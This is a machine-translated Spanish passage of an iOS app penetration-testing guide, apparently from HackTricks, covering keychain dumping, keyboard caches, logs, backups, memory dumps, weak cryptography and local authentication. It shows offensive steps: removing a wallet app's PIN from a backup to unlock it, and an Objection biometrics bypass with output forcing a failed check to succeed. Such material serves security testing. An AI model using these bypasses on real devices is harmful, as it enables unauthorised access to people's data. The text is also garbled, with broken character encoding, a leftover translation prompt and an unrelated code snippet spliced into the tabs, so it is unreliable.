En el contexto de la pirater√≠a √©tica, el conocimiento de Objective-C es √∫til para realizar pruebas de penetraci√≥n en aplicaciones iOS. Al comprender c√≥mo se escriben y estructuran las aplicaciones en Objective-C, los piratas inform√°ticos pueden identificar posibles vulnerabilidades y explotarlas para obtener acceso no autorizado a la aplicaci√≥n o a los datos del usuario.

Algunas t√©cnicas comunes de pirater√≠a en aplicaciones iOS que involucran Objective-C incluyen la inyecci√≥n de c√≥digo, la manipulaci√≥n de datos en tiempo de ejecuci√≥n y la explotaci√≥n de vulnerabilidades conocidas en bibliotecas y marcos de Objective-C.

Es importante tener en cuenta que la pirater√≠a √©tica debe realizarse con el consentimiento del propietario de la aplicaci√≥n y siguiendo las leyes y regulaciones aplicables. El objetivo principal de la pirater√≠a √©tica es identificar y remediar las vulnerabilidades de seguridad en lugar de causar da√±o o robar informaci√≥n confidencial.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Esto establece la imagen de fondo como `overlayImage.png` cada vez que la aplicaci√≥n se pone en segundo plano. Esto evita fugas de datos sensibles porque `overlayImage.png` siempre sobrescribir√° la vista actual.

### Keychain

Herramientas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) se pueden utilizar para volcar el keychain (el dispositivo debe estar jailbroken).\
Tambi√©n puedes usar `ios keychain dump` de [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** es la clase perfecta para **almacenar nombre de usuario y contrase√±a en el keychain**. No es necesario preocuparse por NSUserDefaults ni por ning√∫n envoltorio de keychain.\
Una vez que el usuario ha iniciado sesi√≥n, puedes almacenar su nombre de usuario y contrase√±a en el keychain:
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Puedes usar `ios nsurlcredentialstorage dump` de **Objection** para volcar estas contrase√±as.

## Teclados personalizados/Cach√© del teclado

A partir de iOS 8.0, Apple permite instalar extensiones personalizadas para iOS, como teclados personalizados.\
Los teclados instalados se pueden gestionar a trav√©s de **Ajustes** > **General** > **Teclado** > **Teclados**.\
Los teclados personalizados se pueden utilizar para **interceptar** las **pulsaciones de teclas** y enviarlas al servidor del atacante. Sin embargo, ten en cuenta que **los teclados personalizados que requieren conectividad de red se notificar√°n al usuario**.\
Adem√°s, el **usuario puede cambiar a un teclado diferente** (m√°s confiable) **para introducir las credenciales**.

Adem√°s, **las aplicaciones pueden evitar que sus usuarios utilicen teclados personalizados** dentro de la aplicaci√≥n (o al menos en partes sensibles de la aplicaci√≥n).

{% hint style="warning" %}
Se recomienda no permitir teclados de terceros si consideras que los usuarios no los necesitar√°n.
{% endhint %}

Ten en cuenta que debido a la autocorrecci√≥n y las sugerencias autom√°ticas, el teclado predeterminado de iOS capturar√° y almacenar√° cada palabra no est√°ndar en un archivo de cach√© si el atributo **secureTextEntry** no est√° establecido en **true** o si **autoCorrectionType** no est√° establecido en **UITextAutoCorrectionTypeNo**.

Por defecto, los teclados **almacenan esta cach√©** dentro del sandbox de las aplicaciones en el archivo `Library/Keyboard/{locale}-dynamic-text.dat` o en `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Sin embargo, es posible que est√© guardando los datos en otro lugar.\
Es posible restablecer la cach√© en _**Ajustes**_ > _**General**_ > _**Restablecer**_ > _**Restablecer diccionario del teclado**_

{% hint style="info" %}
Por lo tanto, **siempre verifica estos archivos** y busca posibles **informaci√≥n sensible**.\
**Interceptar el tr√°fico de red** es otra forma de comprobar si el teclado personalizado est√° enviando pulsaciones de teclas a un servidor remoto.
{% endhint %}

El protocolo [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) se utiliza para la cach√© del teclado. Las clases UITextField, UITextView y UISearchBar admiten autom√°ticamente este protocolo y ofrecen las siguientes propiedades:

* `var autocorrectionType: UITextAutocorrectionType` determina si se habilita la autocorrecci√≥n durante la escritura. Cuando la autocorrecci√≥n est√° habilitada, el objeto de texto realiza un seguimiento de las palabras desconocidas y sugiere reemplazos adecuados, reemplazando autom√°ticamente el texto escrito a menos que el usuario anule el reemplazo. El valor predeterminado de esta propiedad es `UITextAutocorrectionTypeDefault`, que para la mayor√≠a de los m√©todos de entrada habilita la autocorrecci√≥n.
* `var secureTextEntry: BOOL` determina si se desactiva la copia de texto y la cach√© de texto y oculta el texto que se est√° ingresando para `UITextField`. El valor predeterminado de esta propiedad es `NO`.

**Para identificar este comportamiento en el c√≥digo:**

* Busca en el c√≥digo fuente implementaciones similares, como
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Abre los archivos xib y storyboard en el `Interface Builder` de Xcode y verifica los estados de `Secure Text Entry` y `Correction` en el `Inspector de Atributos` para el objeto correspondiente.

La aplicaci√≥n debe evitar el almacenamiento en cach√© de informaci√≥n sensible ingresada en los campos de texto. Puedes evitar el almacenamiento en cach√© desactiv√°ndolo program√°ticamente, utilizando la directiva `textObject.autocorrectionType = UITextAutocorrectionTypeNo` en los UITextFields, UITextViews y UISearchBars deseados. Para los datos que deben estar enmascarados, como los PIN y las contrase√±as, establece `textObject.secureTextEntry` en `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Registros**

Las formas m√°s comunes de depurar c√≥digo es mediante el uso de registros, y la aplicaci√≥n **puede imprimir informaci√≥n sensible dentro de los registros**.\
En la versi√≥n de iOS 6 y anteriores, los registros eran legibles para todo el mundo (una aplicaci√≥n maliciosa pod√≠a leer los registros de otras aplicaciones y extraer informaci√≥n sensible de all√≠). **Hoy en d√≠a, las aplicaciones solo pueden acceder a sus propios registros**.

Sin embargo, un **atacante** con **acceso f√≠sico** a un dispositivo **desbloqueado** puede conectarlo a una computadora y **leer los registros** (ten en cuenta que los registros escritos en el disco por una aplicaci√≥n no se eliminan si la aplicaci√≥n se desinstala).

Se recomienda **navegar por todas las pantallas** de la aplicaci√≥n e **interactuar** con **cada** elemento de la interfaz de usuario y **funcionalidad** y proporcionar texto de entrada en todos los campos de texto y **revisar los registros** en busca de **informaci√≥n** **sensible** expuesta.

Utiliza las siguientes palabras clave para verificar el c√≥digo fuente de la aplicaci√≥n en busca de declaraciones de registro predefinidas y personalizadas:

* Para funciones predefinidas e integradas:
* NSLog
* NSAssert
* NSCAssert
* fprintf
* Para funciones personalizadas:
* Logging
* Logfile

**Monitoreo de los registros del sistema**

Muchas aplicaciones registran mensajes informativos (y potencialmente sensibles) en el registro de la consola. El registro tambi√©n contiene informes de errores y otra informaci√≥n √∫til.

Puedes utilizar estas herramientas:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Puedes recopilar los registros de la consola a trav√©s de la ventana **Dispositivos** de Xcode de la siguiente manera:

1. Inicia Xcode.
2. Conecta tu dispositivo a tu computadora principal.
3. Elige **Ventana** -> **Dispositivos y Simuladores**.
4. Haz clic en tu dispositivo iOS conectado en la secci√≥n izquierda de la ventana Dispositivos.
5. Reproduce el problema.
6. Haz clic en el bot√≥n **Abrir Consola** ubicado en la parte superior derecha de la ventana Dispositivos para ver los registros de la consola en una ventana separada.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (15).png>)

Tambi√©n puedes conectarte a la shell del dispositivo como se explica en Acceso a la Shell del Dispositivo, instalar **socat** a trav√©s de **apt-get** y ejecutar el siguiente comando:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y automatizar f√°cilmente flujos de trabajo con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Copias de seguridad

iOS incluye funciones de copia de seguridad autom√°tica que crean copias de los datos almacenados en el dispositivo. Puedes hacer **copias de seguridad de iOS** desde tu computadora host utilizando iTunes (hasta macOS Catalina) o Finder (desde macOS Catalina en adelante), o a trav√©s de la funci√≥n de copia de seguridad de iCloud. En ambos casos, la copia de seguridad incluye casi todos los datos almacenados en el dispositivo iOS, excepto datos altamente sensibles como la informaci√≥n de Apple Pay y la configuraci√≥n de Touch ID.

Dado que iOS realiza copias de seguridad de las aplicaciones instaladas y sus datos, una preocupaci√≥n obvia es si los datos sensibles del usuario almacenados por la aplicaci√≥n podr√≠an **filtrarse accidentalmente a trav√©s de la copia de seguridad**. Otra preocupaci√≥n, aunque menos obvia, es si se podr√≠an manipular las **configuraciones de protecci√≥n de datos o restricci√≥n de funcionalidad de la aplicaci√≥n para cambiar el comportamiento de la aplicaci√≥n despu√©s de restaurar una copia de seguridad modificada**. Ambas preocupaciones son v√°lidas y estas vulnerabilidades han demostrado existir en una gran cantidad de aplicaciones en la actualidad.

Una copia de seguridad de un dispositivo en el que se ha instalado una aplicaci√≥n m√≥vil incluir√° todos los subdirectorios (excepto `Library/Caches/`) y archivos en el [directorio privado de la aplicaci√≥n](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12).\
Por lo tanto, **evita almacenar datos sensibles en texto plano dentro de los archivos o carpetas que se encuentran en el directorio privado de la aplicaci√≥n o sus subdirectorios**.

Aunque todos los archivos en `Documents/` y `Library/Application Support/` siempre se respaldan de forma predeterminada, puedes [excluir archivos de la copia de seguridad](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28) llamando a `NSURL setResourceValue:forKey:error:` con la clave `NSURLIsExcludedFromBackupKey`.\
Puedes utilizar las propiedades del sistema de archivos [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey) y [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey) para excluir archivos y directorios de las copias de seguridad.

{% hint style="warning" %}
Por lo tanto, al verificar la copia de seguridad de una aplicaci√≥n, debes verificar si **alguna informaci√≥n sensible** es accesible y si puedes **modificar alg√∫n comportamiento sensible** de la aplicaci√≥n mediante la **modificaci√≥n de alguna configuraci√≥n de la copia de seguridad** y la restauraci√≥n de la copia de seguridad.
{% endhint %}

**C√≥mo probar**

Comienza por **crear una copia de seguridad del dispositivo** (puedes hacerlo utilizando Finder) y encontrar d√≥nde se almacena la copia de seguridad. La documentaci√≥n oficial de Apple te ayudar√° a [localizar las copias de seguridad de tu iPhone, iPad y iPod touch](https://support.apple.com/es-es/HT204215).

Una vez que hayas encontrado la copia de seguridad del dispositivo (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), puedes comenzar a buscar informaci√≥n sensible utilizando, por ejemplo, el comando grep o herramientas como [iMazing](https://imazing.com).

Para identificar si una copia de seguridad est√° encriptada, puedes verificar la clave llamada "IsEncrypted" en el archivo "Manifest.plist", ubicado en la ra√≠z del directorio de la copia de seguridad. El siguiente ejemplo muestra una configuraci√≥n que indica que la copia de seguridad est√° encriptada:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
En caso de que necesites trabajar con una copia de seguridad encriptada, hay algunos scripts en Python en el repositorio de GitHub de DinoSec, como **backup_tool.py** y **backup_passwd.py**, que servir√°n como un buen punto de partida. Sin embargo, ten en cuenta que es posible que no funcionen con las √∫ltimas versiones de iTunes/Finder y es posible que necesiten ajustes.

Tambi√©n puedes utilizar la herramienta **iOSbackup** para leer y extraer f√°cilmente archivos de una copia de seguridad de iOS encriptada con contrase√±a.

**C√≥mo modificar el comportamiento**

En la aplicaci√≥n de billetera de Bitcoin de c√≥digo abierto, Bither, ver√°s que es posible configurar un PIN para bloquear la interfaz de usuario. Este PIN se almacena en el archivo `net.bither.plist` dentro de la **clave** **pin_code**. Si borras esta clave de ese plist en la copia de seguridad y restauras la copia de seguridad, podr√°s acceder a la billetera.

## Pruebas de memoria para datos sensibles

En alg√∫n momento, la informaci√≥n sensible se almacenar√° en la memoria. El objetivo es asegurarse de que esta informaci√≥n se exponga el menor tiempo posible.

Para investigar la memoria de una aplicaci√≥n, primero crea un **volcado de memoria**. Alternativamente, puedes **analizar la memoria en tiempo real** con, por ejemplo, un depurador. Independientemente del m√©todo que utilices, este proceso es propenso a errores porque los volcados proporcionan los datos dejados por las funciones ejecutadas y es posible que te saltes pasos cr√≠ticos. Adem√°s, es bastante f√°cil pasar por alto datos durante el an√°lisis a menos que conozcas la huella de los datos que est√°s buscando (ya sea su valor exacto o su formato). Por ejemplo, si la aplicaci√≥n cifra seg√∫n una clave sim√©trica generada aleatoriamente, es muy improbable que encuentres la clave en la memoria a menos que encuentres su valor de otras formas.

**Recuperaci√≥n y an√°lisis de un volcado de memoria**

Ya sea que est√©s utilizando un dispositivo con jailbreak o sin jailbreak, puedes volcar la memoria del proceso de la aplicaci√≥n con [objection](https://github.com/sensepost/objection) y [Fridump](https://github.com/Nightbringer21/fridump).

Despu√©s de que se haya volcado la memoria (por ejemplo, en un archivo llamado "memory"), dependiendo de la naturaleza de los datos que est√°s buscando, necesitar√°s un conjunto de herramientas diferentes para procesar y analizar ese volcado de memoria. Por ejemplo, si te est√°s enfocando en cadenas de texto, puede ser suficiente ejecutar el comando `strings` o `rabin2 -zz` para extraer esas cadenas.
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Abre `strings.txt` en tu editor favorito y exam√≠nalo para identificar informaci√≥n sensible.

Sin embargo, si deseas inspeccionar otro tipo de datos, es mejor que uses radare2 y sus capacidades de b√∫squeda. Consulta la ayuda de radare2 sobre el comando de b√∫squeda (`/?`) para obtener m√°s informaci√≥n y una lista de opciones. Lo siguiente muestra solo un subconjunto de ellas:
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**An√°lisis de la memoria en tiempo de ejecuci√≥n**

Usando [**r2frida**](https://github.com/nowsecure/r2frida) puedes analizar e inspeccionar la memoria de la aplicaci√≥n mientras se ejecuta sin necesidad de volcarla. Por ejemplo, puedes ejecutar los comandos de b√∫squeda anteriores desde r2frida y buscar en la memoria una cadena, valores hexadecimales, etc. Al hacerlo, recuerda agregar una barra invertida `\` antes del comando de b√∫squeda (y cualquier otro comando espec√≠fico de r2frida) despu√©s de iniciar la sesi√≥n con `r2 frida://usb//<nombre_de_tu_aplicaci√≥n>`.

## Criptograf√≠a defectuosa

### Procesos de gesti√≥n de claves deficientes

Algunos desarrolladores guardan datos sensibles en el almacenamiento local y los cifran con una clave codificada/predeterminada en el c√≥digo. Esto no deber√≠a hacerse, ya que un an√°lisis inverso podr√≠a permitir a los atacantes extraer la informaci√≥n confidencial.

### Uso de algoritmos inseguros y/o obsoletos

Los desarrolladores no deber√≠an utilizar **algoritmos obsoletos** para realizar **verificaciones** de autorizaci√≥n, **almacenar** o **enviar** datos. Algunos de estos algoritmos son: RC4, MD4, MD5, SHA1... Si se utilizan **hashes** para almacenar contrase√±as, por ejemplo, se deben utilizar hashes resistentes a ataques de fuerza bruta con sal.

### Verificaci√≥n

Las principales verificaciones a realizar son buscar contrase√±as/secretos **codificados en el c√≥digo**, o si estos son **predecibles**, y si el c√≥digo est√° utilizando alg√∫n tipo de algoritmo de **criptograf√≠a d√©bil**.

Es interesante saber que puedes **monitorizar** autom√°ticamente algunas **bibliotecas de criptograf√≠a** utilizando **objection** con:
```swift
ios monitor crypt
```
Para obtener **m√°s informaci√≥n** sobre las API y bibliotecas criptogr√°ficas de iOS, acceda a [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autenticaci√≥n local

El probador debe tener en cuenta que **siempre se debe aplicar la autenticaci√≥n local en un punto final remoto** o basada en una primitiva criptogr√°fica. Los atacantes pueden evadir f√°cilmente la autenticaci√≥n local si no se devuelve ning√∫n dato del proceso de autenticaci√≥n.

El [**framework de Autenticaci√≥n Local**](https://developer.apple.com/documentation/localauthentication) proporciona un conjunto de API para que los desarrolladores extiendan un di√°logo de autenticaci√≥n a un usuario. En el contexto de la conexi√≥n a un servicio remoto, es posible (y recomendado) aprovechar el [llavero](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) para implementar la autenticaci√≥n local.

El sensor de **identificaci√≥n de huellas dactilares** es operado por el [coprocesador de seguridad SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) y no expone los datos de huellas dactilares a ninguna otra parte del sistema. Adem√°s de Touch ID, Apple introdujo _Face ID_: que permite la autenticaci√≥n basada en el reconocimiento facial.

Los desarrolladores tienen dos opciones para incorporar la autenticaci√≥n Touch ID/Face ID:

* `LocalAuthentication.framework` es una API de alto nivel que se puede utilizar para **autenticar al usuario a trav√©s de Touch ID**. La aplicaci√≥n no puede acceder a ning√∫n dato asociado con la huella digital registrada y solo se le notifica si la autenticaci√≥n fue exitosa.
* `Security.framework` es una API de nivel inferior para acceder a los [servicios del llavero](https://developer.apple.com/documentation/security/keychain\_services). Esta es una opci√≥n segura si su aplicaci√≥n necesita **proteger algunos datos secretos con autenticaci√≥n biom√©trica**, ya que el control de acceso se gestiona a nivel del sistema y no se puede evadir f√°cilmente. `Security.framework` tiene una API en C, pero hay varios [envoltorios de c√≥digo abierto disponibles](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), lo que facilita el acceso al llavero de la misma manera que a NSUserDefaults.

{% hint style="danger" %}
Tenga en cuenta que el uso de `LocalAuthentication.framework` o `Security.framework` puede ser eludido por un atacante, ya que solo devuelve un valor booleano y no datos para continuar. Consulte [Don't touch me that way, de David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) para obtener m√°s detalles.
{% endhint %}

### Framework de Autenticaci√≥n Local

Los desarrolladores pueden mostrar un **cuadro de di√°logo de autenticaci√≥n** utilizando la funci√≥n **`evaluatePolicy`** de la clase **`LAContext`**. Dos pol√≠ticas disponibles definen las formas aceptables de autenticaci√≥n:

* `deviceOwnerAuthentication`(Swift) o `LAPolicyDeviceOwnerAuthentication`(Objective-C): Cuando est√° disponible, se le solicita al usuario que realice la autenticaci√≥n de Touch ID. Si Touch ID no est√° activado, se solicita el c√≥digo de acceso del dispositivo en su lugar. Si el c√≥digo de acceso del dispositivo no est√° habilitado, la evaluaci√≥n de la pol√≠tica falla.
* `deviceOwnerAuthenticationWithBiometrics` (Swift) o `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C): La autenticaci√≥n se limita a la biometr√≠a, donde se le solicita al usuario que utilice Touch ID.

La funci√≥n **`evaluatePolicy` devuelve un valor booleano** que indica si el usuario se ha autenticado correctamente. Lo que significa que puede ser f√°cilmente eludido (ver a continuaci√≥n)

### Autenticaci√≥n Local utilizando el Llavero

Las **API del llavero de iOS se pueden (y deben) utilizar para implementar la autenticaci√≥n local**. Durante este proceso, la aplicaci√≥n almacena un token de autenticaci√≥n secreto u otro dato secreto que identifica al usuario en el llavero. Para autenticarse en un servicio remoto, el usuario debe desbloquear el llavero utilizando su contrase√±a o huella digital para obtener los datos secretos.

El llavero permite guardar elementos con el atributo especial `SecAccessControl`, que permitir√° el acceso al elemento solo desde el llavero despu√©s de que el usuario haya pasado la autenticaci√≥n de Touch ID (o el c√≥digo de acceso, si los par√°metros del atributo lo permiten).

En el siguiente ejemplo, guardaremos la cadena "test\_strong\_password" en el llavero. La cadena solo se puede acceder en el dispositivo actual mientras el c√≥digo de acceso est√© configurado (`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` par√°metro) y despu√©s de la autenticaci√≥n de Touch ID solo para los dedos actualmente registrados (`SecAccessControlCreateFlags.biometryCurrentSet` par√°metro):

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

El siguiente es un ejemplo de c√≥digo Objective-C para realizar una solicitud HTTP utilizando la biblioteca AFNetworking:

```objective-c
#import <AFNetworking/AFNetworking.h>

- (void)makeHTTPRequest {
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    [manager GET:@"https://api.example.com/data" parameters:nil progress:nil success:^(NSURLSessionTask *task, id responseObject) {
        NSLog(@"Response: %@", responseObject);
    } failure:^(NSURLSessionTask *operation, NSError *error) {
        NSLog(@"Error: %@", error);
    }];
}
```

Este c√≥digo utiliza AFNetworking para realizar una solicitud GET a la URL "https://api.example.com/data". El resultado de la solicitud se imprime en la consola.

Para utilizar AFNetworking en su proyecto Objective-C, debe agregar la biblioteca a su proyecto y asegurarse de importarla en su archivo de implementaci√≥n.

Puede encontrar m√°s informaci√≥n sobre AFNetworking en su [repositorio de GitHub](https://github.com/AFNetworking/AFNetworking).
```
{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Ahora podemos solicitar el elemento guardado del llavero. Los servicios del llavero presentar√°n el di√°logo de autenticaci√≥n al usuario y devolver√°n los datos o nil dependiendo de si se proporcion√≥ una huella digital adecuada o no.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

El siguiente es un contenido de un libro de hacking sobre t√©cnicas de hacking. El siguiente contenido es del archivo mobile-pentesting/ios-pentesting/README.md. Traduzca el texto relevante al espa√±ol y devuelva la traducci√≥n manteniendo exactamente la misma sintaxis de markdown y html. No traduzca cosas como c√≥digo, nombres de t√©cnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregue nada adicional aparte de la traducci√≥n y la sintaxis de markdown.
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Detecci√≥n

El uso de frameworks en una aplicaci√≥n tambi√©n puede ser detectado mediante el an√°lisis de la lista de bibliotecas din√°micas compartidas del binario de la aplicaci√≥n. Esto se puede hacer utilizando `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Si se utiliza `LocalAuthentication.framework` en una aplicaci√≥n, la salida contendr√° ambas de las siguientes l√≠neas (recuerda que `LocalAuthentication.framework` utiliza `Security.framework` internamente):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Si se utiliza `Security.framework`, solo se mostrar√° el segundo.

### Bypass del Marco de Autenticaci√≥n Local

#### Objection

[**Objection Biometrics Bypass**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) se puede utilizar para evitar la autenticaci√≥n local. Objection **utiliza Frida para instrumentar la funci√≥n `evaluatePolicy` para que devuelva `True`** incluso si la autenticaci√≥n no se realiz√≥ correctamente. Utiliza el comando `ios ui biometrics_bypass` para evitar la autenticaci√≥n biom√©trica insegura. Objection registrar√° un trabajo que reemplazar√° el resultado de `evaluatePolicy`. Funcionar√° tanto en implementaciones Swift como Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Si es vulnerable, el m√≥dulo autom√°ticamente omitir√° el formulario de inicio de sesi√≥n.

#### Frida

Un ejemplo de uso de **`evaluatePolicy`** de la aplicaci√≥n [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
